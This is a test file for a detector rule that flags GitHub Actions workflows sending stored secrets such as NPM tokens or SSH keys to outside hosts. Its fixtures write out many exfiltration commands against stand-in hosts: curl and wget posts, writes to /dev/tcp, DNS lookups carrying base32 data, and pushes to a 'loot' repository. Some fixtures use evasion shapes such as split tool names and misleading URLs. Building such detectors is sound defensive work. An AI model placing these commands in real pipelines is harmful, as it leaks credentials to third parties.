/**
 * WORKFLOW_SECRET_TO_UPLOAD_PATH is a whole-file check with two parts. The
 * earlier condition (a `secrets.` expression and a network word anywhere) is a
 * floor: whatever it reported is still reported. A finer check adds what it
 * missed: a stored secret in any expression form (not the run's own token, not
 * a presence test) together with an outbound call in executed text or an
 * artifact upload.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { modelWorkflows } from "../workflow-modeler.js";
import { performanceBudget } from "./performance-budget.js";

const RULE = "WORKFLOW_SECRET_TO_UPLOAD_PATH";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-wf-egress-"));
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, lines: string[]): void {
  const full = path.join(dir, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, lines.join("\n"));
}

function workflow(lines: string[], name = "ci.yml"): void {
  write(`.github/workflows/${name}`, lines);
}

function files(): string[] {
  return modelWorkflows(dir)
    .filter((f) => f.rule === RULE)
    .map((f) => f.file!);
}

const HEAD = ["name: CI", "on: push", "jobs:", "  build:", "    runs-on: ubuntu-latest", "    steps:"];

/**
 * `secrets.NAME` written as `secrets['NAME']`: the same secret to the finer
 * check, but not to the earlier condition, which only reads the dotted form.
 * The finer check is tested in this form, both what it reports and what not.
 */
const bracketed = (lines: string[]): string[] => lines.map((l) => l.replace(/secrets\.([\w-]+)/g, "secrets['$1']"));

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: a stored secret and egress in one workflow", () => {
  it.each([
    ["an env secret and a curl", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: curl -d "$T" https://x.example']],
    ["a secret in the run body", ['      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.example']],
    ["bracket access", ["      - env:", "          T: ${{ secrets['NPM_TOKEN'] }}", '        run: wget --post-data "$T" https://x.example']],
    ["the whole secrets context", ["      - env:", "          ALL: ${{ toJSON(secrets) }}", "        run: echo ok"], "      - uses: actions/upload-artifact@v4"],
    ["an artifact upload", ["      - env: { T: \"${{ secrets.NPM_TOKEN }}\" }", '        run: echo "$T" > k.txt', "      - uses: actions/upload-artifact@v4", "        with:", "          path: k.txt"]],
    ["ssh with a deploy key", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', '        run: echo "$KEY" > k && ssh -i k deploy@x.example ./deploy.sh']],
    ["scp to a remote host", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: scp out.txt user@x.example:/tmp/"]],
    ["python requests", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: python3 -c "import requests; requests.post('https://x.example', data='x')"`]],
    ["git push to a remote that is not GitHub", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push https://x.example/r.git HEAD"]],
    ["git push to a host:path remote", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push deploy@x.example:r.git HEAD"]],
    ["git push to a git:// remote", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push git://x.example/r.git HEAD"]],
    ["a tool name split by quoting", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: c''url -d \"$T\" https://x.example"]],
    ["a curl after an escaped quote and a hash", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: echo "a\\" #"; curl -d "$T" https://x.example']],
    ["a secret in a URL's credentials", ["      - run: git clone https://x:${{ secrets.K }}@x.example/r.git"]],
    ["a publish to another registry", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry https://x.example/npm/"]],
    ["an upload-artifact merge", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: echo "$T" > k.txt', "      - uses: actions/upload-artifact/merge@v4"]],
    ["a proxy written onto curl's option", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: curl -xx.example:3128 -d "$T" http://localhost/']],
    ["a proxy variable in front of a loopback call", ["      - env:", '          T: "${{ secrets.NPM_TOKEN }}"', "          HTTPS_PROXY: http://x.example:3128", '        run: curl -d "$T" http://localhost/']],
    ["a one-line flow-map step", [`      - { name: x, run: 'curl -d "\${{ secrets.NPM_TOKEN }}" https://x.example' }`]],
    ["a quoted flow-map run handing a URL to a script", ['      - { env: { T: "${{ secrets.NPM_TOKEN }}" }, run: \'python send.py https://x.example\' }']],
    ["a one-line flow-map upload", ['      - run: echo "${{ secrets.NPM_TOKEN }}" > k.txt', "      - { uses: actions/upload-artifact@v4, with: { path: k.txt } }"]],
    ["a registry option set with =", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry=https://x.example/npm/"]],
    ["a URL handed to a script", ['      - run: python send.py https://x.example "${{ secrets.NPM_TOKEN }}"']],
    ["a URL inside a Ruby call", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: ruby -rnet/http -e 'Net::HTTP.post(URI("https://x.example/c"), ENV["T"])'`]],
    ["a URL whose query hides a trusted host from a naive parser", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: ruby -rnet/http -e 'Net::HTTP.post(URI("https://x.example?@github.com/"), ENV["T"])'`]],
    ["a URL inside a PHP call", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: php -r 'file_get_contents("https://x.example/c?t=".getenv("T"));'`]],
    ["a URL in a github-script request", ["      - uses: actions/github-script@v7", '        env: { T: "${{ secrets.NPM_TOKEN }}" }', "        with:", "          script: |", "            await github.request({method:'POST',url:'https://x.example/c',data:process.env.T})"]],
    ["a write to /dev/tcp", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: echo "$T" > /dev/tcp/x.example/80']],
    ["a DNS lookup carrying data", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: nslookup "$(echo $T | base32)".x.example']],
    ["a copy to a bucket", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: aws s3 cp e.txt s3://x-bucket/"]],
    ["an image push to another registry", ["      - run: docker build --build-arg T=${{ secrets.NPM_TOKEN }} -t x.example/i:1 . && docker push x.example/i:1"]],
    ["a secret after a hash inside a multi-line string", ["      - run: |", '          MSG="build', '          #${{ secrets.NPM_TOKEN }}"', '          curl -d "$MSG" https://x.example/c']],
    ["the arguments of a docker:// action", ["      - uses: docker://curlimages/curl:8.8.0", "        with:", "          args: -d ${{ secrets.NPM_TOKEN }} https://x.example/c"]],
    ["a JavaScript private field in a github-script body", ["      - uses: actions/github-script@v7", '        env: { T: "${{ secrets.NPM_TOKEN }}" }', "        with:", "          script: |", '            class C { #p = fetch("https://x.example/?" + process.env.T) }']],
    ["a secret after an escaped quote and a hash", ['      - run: echo "a\\" #"; curl -d "${{ secrets.NPM_TOKEN }}" https://x.example/c']],
  ] as Array<[string, string[], string?]>)("reports %s", (_label, steps, extra) => {
    workflow([...HEAD, ...bracketed([...steps, ...(extra ? [extra] : [])])]);
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });

  it("reports a run body given as a YAML alias of an anchored command", () => {
    workflow(bracketed([
      "name: CI",
      "on: push",
      'x-send: &send curl -d "$T" https://x.example/c',
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
      "        run: *send",
    ]));
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });

  it("reports a workflow-level env secret with a curl in another job", () => {
    workflow(bracketed([
      "name: CI",
      "on: push",
      "env:",
      "  T: ${{ secrets.NPM_TOKEN }}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: curl -H "Authorization: $T" https://x.example',
    ]));
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: the earlier condition is a floor", () => {
  // Every case below is quiet for the finer check (see the next block), and is
  // still reported because a dotted secret and a network word share the file.
  it.each([
    ["only the run's own token", ['      - env: { T: "${{ secrets.GITHUB_TOKEN }}" }', '        run: curl -H "Authorization: $T" https://api.x.example']],
    ["loopback calls only", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: curl http://127.0.0.1:8080/health"]],
    ["a URL outside executed text", ["      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567", "        with:", "          url: https://x.example", "          token: ${{ secrets.NPM_TOKEN }}"]],
    ["curl only in a comment", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: npm test # curl https://x.example"]],
    ["fetch-depth", ["      - uses: actions/checkout@v4", "        with:", "          fetch-depth: 0", '      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: npm test"]],
  ])("reports %s, as it always has", (_label, steps) => {
    workflow([...HEAD, ...steps]);
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });

  // Shapes a reviewer found that the finer check alone missed; the floor keeps them.
  it.each([
    ["a custom shell template", ["      - name: report", '        shell: curl -s -d "@{0}" https://collector.x.example/in', '        env: { NPM: "${{ secrets.NPM_TOKEN }}" }', "        run: env"]],
    ["an anchored block scalar run by alias", ["      - name: report", '        env: { NPM: "${{ secrets.NPM_TOKEN }}" }', "        run: *cmd"], ["env:", "  PAYLOAD: &cmd |", '    curl -s -d "$NPM" https://collector.x.example/in']],
    ["an anchored value on the next line", ["      - name: report", '        env: { NPM: "${{ secrets.NPM_TOKEN }}" }', "        run: *cmd"], ["env:", "  PAYLOAD: &cmd", '    curl -s -d "$NPM" https://collector.x.example/in']],
    ["block-scalar args of a docker action", ["      - uses: docker://alpine:3.20", '        env: { NPM: "${{ secrets.NPM_TOKEN }}" }', "        with:", "          args: >-", '            -c "wget -q --post-data=$NPM collector.x.example/in"']],
    ["a URL in env used by a repository script", ["      - env:", "          NPM: ${{ secrets.NPM_TOKEN }}", "          ENDPOINT: https://collector.x.example/in", "        run: python3 scripts/report.py"]],
    ["a push to a GitHub repository someone else owns", ["      - run: |", '          echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" > k && git add k && git commit -qm x', "          git push https://bot:${{ secrets.LOOT_PAT }}@github.com/some-account/loot HEAD:main"]],
  ] as Array<[string, string[], string[]?]>)("reports %s", (_label, steps, top) => {
    workflow(["name: CI", "on: push", ...(top ?? []), "jobs:", "  build:", "    runs-on: ubuntu-latest", "    steps:", ...steps]);
    expect(files()).toEqual([".github/workflows/ci.yml"]);
  });

  it("stays quiet without a dotted secret or without a network word", () => {
    workflow([...HEAD, '      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: npm test"], "a.yml");
    workflow([...HEAD, "      - run: curl https://x.example/health"], "b.yml");
    expect(files()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what the finer check does not count", () => {
  it.each([
    ["no secret", ["      - run: curl https://x.example/health"]],
    ["only the run's own token", ['      - env: { T: "${{ secrets.GITHUB_TOKEN }}" }', '        run: curl -H "Authorization: $T" https://api.x.example']],
    ["github.token", ['      - env: { T: "${{ github.token }}" }', '        run: curl -H "Authorization: $T" https://api.x.example']],
    ["a secret only tested for presence", ["      - if: ${{ secrets.DEPLOY_KEY != '' }}", "        run: curl https://x.example/health"]],
    ["loopback calls only", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: curl http://127.0.0.1:8080/health && wget -q localhost:3000"]],
    ["git fetch and fetch-depth", ["      - uses: actions/checkout@v4", "        with:", "          fetch-depth: 0", '      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git fetch origin main"]],
    ["curl in a shell comment inside the run block", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: |", "          npm publish", "          # curl -d \"$T\" https://x.example", "          echo done # wget https://x.example"]],
    ["a tool name outside executed text", ['      - name: curl the health endpoint after the build', '        env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: npm run build"]],
    ["a URL outside executed text", ["      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567", "        with:", "          url: https://x.example", "          token: ${{ secrets.NPM_TOKEN }}"]],
    ["ssh-keygen and ssh to loopback", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', "        run: ssh-keygen -R x.example && ssh -p 2222 git@127.0.0.1 true"]],
    ["gh api", ['      - env: { GH_TOKEN: "${{ secrets.RELEASE_PAT }}" }', "        run: gh api repos/o/r/releases"]],
    ["a secret in the credentials of a GitHub URL", ["      - run: git push https://x-access-token:${{ secrets.RELEASE_PAT }}@github.com/o/r.git HEAD"]],
    ["npm publish to the public registry", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry https://registry.npmjs.org/"]],
    ["URLs of GitHub and a public registry handed to a script", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: node notes.js https://github.com/o/r/releases https://registry.npmjs.org/p"]],
    ["a proxy variable pointing at loopback", ["      - env:", '          T: "${{ secrets.NPM_TOKEN }}"', "          HTTPS_PROXY: http://127.0.0.1:3128", "        run: curl http://localhost/health"]],
    ["a URL inside an expression's fallback", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: BASE_URL=\"${{ inputs.base_url || 'https://x.example' }}\" npm test"]],
    ["an image push to a public registry", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: docker push ghcr.io/o/i:1 && docker push o/i:1"]],
    ["an anchored value with a URL when no run body is an alias", ["      - env:", '          T: "${{ secrets.NPM_TOKEN }}"', "          HOME_PAGE: &home https://x.example/docs", "        run: npm test"]],
    ["args with a URL for an action that is not a docker image", ["      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567", "        with:", "          args: --url https://x.example", "          token: ${{ secrets.NPM_TOKEN }}"]],
    ["dig and drill as variable names in a script", ["      - uses: actions/github-script@v7", '        env: { T: "${{ secrets.NPM_TOKEN }}" }', "        with:", "          script: |", "            const dig = 1;", "            drill.run(dig);"]],
    ["a flow-map step without egress", ['      - { name: x, run: \'echo "${{ secrets.NPM_TOKEN }}" | wc -c\' }']],
  ])("does not report %s", (_label, steps) => {
    workflow([...HEAD, ...bracketed(steps)]);
    expect(files()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: each file on its own", () => {
  it("keeps scanning the files after one it cannot classify", () => {
    // A huge first file must not end the loop for the ones after it.
    workflow([...HEAD, "      - run: " + "a;".repeat(200_000)], "a-lint.yml");
    workflow(bracketed([...HEAD, '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.example']), "b-exfil.yml");
    expect(files()).toEqual([".github/workflows/b-exfil.yml"]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
  const FIVE_MIB = 5 * 1024 * 1024;

  // Bracketed, so the finer check runs: a dotted secret with a network word
  // is settled by the earlier condition before it.
  function timed(lines: string[]): number {
    workflow(bracketed(lines));
    const started = performance.now();
    modelWorkflows(dir);
    return performance.now() - started;
  }

  it.each([
    ["unclosed expressions", () => [...HEAD, "      - env:", `          T: ${"${{ secrets ".repeat(Math.ceil(FIVE_MIB / 12))}`, "        run: curl https://x.example"]],
    ["fetch( without a literal", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${"fetch( ".repeat(Math.ceil(FIVE_MIB / 7))}`]],
    ["one long curl line of loopback targets", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: curl ${"localhost ".repeat(Math.ceil(FIVE_MIB / 10))}`]],
    ["a run of quotes", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: curl -H ${'"'.repeat(FIVE_MIB)}`]],
    ["scp words that never name a remote", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: scp ${"a@a@a@a@a.b.c.d.e.f.g.h.i ".repeat(Math.ceil(FIVE_MIB / 26))}`]],
    ["ssh options", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ssh ${"-o X ".repeat(Math.ceil(FIVE_MIB / 5))}`]],
    ["quoted command names", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${"c''u\"r\"l ".repeat(Math.ceil(FIVE_MIB / 10))}`]],
    ["git push words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: git push ${"a@b.c:d ".repeat(Math.ceil(FIVE_MIB / 8))}`]],
    ["presence tests", () => [...HEAD, `      - run: echo "${"${{ secrets.X != '' }} ".repeat(Math.ceil(FIVE_MIB / 26))}"`]],
    ["a line of spaces", () => [...HEAD, "      - run: echo ok", " ".repeat(FIVE_MIB)]],
    ["a line of spaces before a dash", () => [...HEAD, "      - run: echo ok", " ".repeat(FIVE_MIB) + "-"]],
    ["URLs with long credentials", () => [...HEAD, `      - run: ${"https://aa:bb@x.example ".repeat(Math.ceil(FIVE_MIB / 26))}`]],
    ["URL prefixes inside calls", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${'URI("https://'.repeat(Math.ceil(FIVE_MIB / 14))}`]],
    // Inside the word: a leading run is taken whole by the `^` alternative.
    ["one curl argument with parentheses inside", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: curl x${"(".repeat(FIVE_MIB)}x`]],
    ["image push words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: docker push ${"-a ".repeat(Math.ceil(FIVE_MIB / 3))}`]],
    ["loopback URL words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: node a.js ${"http://localhost/ ".repeat(Math.ceil(FIVE_MIB / 17))}`]],
    ["proxy variables", () => [...HEAD, `      - env: { T: "\${{ secrets.X }}", ${"http_proxy=localhost, ".repeat(Math.ceil(FIVE_MIB / 23))} }`, "        run: curl localhost"]],
    ["a long flow-map step", () => [...HEAD, `      - { run: '${"{a, ".repeat(Math.ceil(FIVE_MIB / 4))}' }`, '      - env: { T: "${{ secrets.X }}" }']],
  ] as Array<[string, () => string[]]>)("%s", { timeout: performanceBudget(60_000) }, (_label, build) => {
    expect(timed(build())).toBeLessThan(performanceBudget(15_000));
  });
});
